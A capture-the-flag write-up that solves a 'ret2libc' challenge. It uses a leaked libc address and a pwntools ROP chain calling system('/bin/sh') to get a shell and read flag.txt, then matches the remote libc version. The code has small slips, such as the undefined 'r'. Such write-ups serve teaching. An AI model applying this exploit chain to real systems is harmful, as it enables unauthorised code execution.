# ret2libc

## Solution

This binary suffers from an overflow:
```
004011d4  488d45f8           lea     rax, [rbp-0x8 {var_10}]
004011d8  ba37130000         mov     edx, 0x1337
004011dd  4889c6             mov     rsi, rax {var_10}
004011e0  bf00000000         mov     edi, 0x0
004011e5  e856feffff         call    read
```
On the server-side, the binary is compiled with `PIE`, meaning that the address space of the binary is randomized. But, upon closer inspection, one notices that the binary leaks the address of the `rand` function:
```
00401152  488b05872e0000     mov     rax, qword [rel rand]
00401159  4889c6             mov     rsi, rax
0040115c  488d05cc0e0000     lea     rax, [rel data_40202f]  {"Random Value: %p\n"}
00401163  4889c7             mov     rdi, rax  {data_40202f, "Random Value: %p\n"}
00401166  b800000000         mov     eax, 0x0
0040116b  e8c0feffff         call    printf
```
Thus, we need to construct a ROP chain that uses gadgets taken from libc to try to run `/bin/sh` so that we can obtain the contents of `flag.txt`. First, we use the address of rand to determine the address of the base of libc:
```python
# Setup the environment
binary = "./ret2libc.bin"
e = context.binary = ELF(binary)
libc = e.libc
p = process(e.path)

# Get the leaked address
p.recvuntil(b"Random Value: 0x")
leak = int(p.recvS(12), 16)

# Determine the libc base address
libc.address = leak - libc.sym['rand']
```
Thus, we can use this address to build a ROP chain. This chain should run `pop rdi; ret`, add `/bin/sh` to the stack, and then call `system`. Thus, we create the following ROP chain:
```python
pop_rdi_gadget = r.find_gadget(['pop rdi','ret'])[0]
bin_sh_gadget = next(libc.search(b'/bin/sh'))
system_gadget = libc.sym['system']

chain = cyclic(16)
chain += p64(pop_rdi_gadget)
chain += p64(bin_sh_gadget)
chain += p64(system_gadget)
```
We send this chain to the binary in order to get shell, but, oh no, it fails to give us the shell :(. We run the binary and GDB, and see the following issue:
```
Program received signal SIGSEGV, Segmentation fault.
│0x00007f08e3e431d3 in do_system (line=0x7f08e3f8d031 "/bin/sh") at ../sysdeps/posix/system.c:148
│148                            (char *const[]){ (char *) SHELL_NAME,
│(gdb) x/10i $pc
│=> 0x7f08e3e431d3 <do_system+339>:      movaps %xmm0,0x50(%rsp)
```
The issue seems to be occuring during the `movaps` instructions, which means we can add another `ret` statement to fix this error:
```python
ret_gadget = r.find_gadget(['ret'])[0]
pop_rdi_gadget = r.find_gadget(['pop rdi','ret'])[0]
bin_sh_gadget = next(libc.search(b'/bin/sh'))
system_gadget = libc.sym['system']

chain = cyclic(16)
chain += p64(ret_gadget)
chain += p64(pop_rdi_gadget)
chain += p64(bin_sh_gadget)
chain += p64(system_gadget)
```
When we send this chain, we are able to get the shell. Thus, we use a remote to send it over to the live version, but it does not work! Thus, it is likely that they have a different version of libc. We thus take the address of `rand` given in by the remote binary, and put it into a libc database to see which version it is using. When entered, this gives ten possibilities for the version of libc:
```
libc6-amd64_2.31-6_i386
libc6_2.31-6_amd64
libc6-amd64_2.31-5_i386
libc6_2.31-5_amd64
libc6_2.28-0ubuntu1_amd64
libc-2.31-6.2.i686
libc6_2.13-0ubuntu13.2_i386
libc-2.31-6.3.i686
libc6_2.13-0ubuntu13_i386
libc6_2.13-0ubuntu9_i386
```
At this stage, I decided to use a brute force method to see which version of libc is the correct one. Through this, I determined that `libc6_2.28-0ubuntu1_amd64` was the version of libc being run on the remote server. Thus, after running my exploit, I gained shell and typed `cat flag.txt`.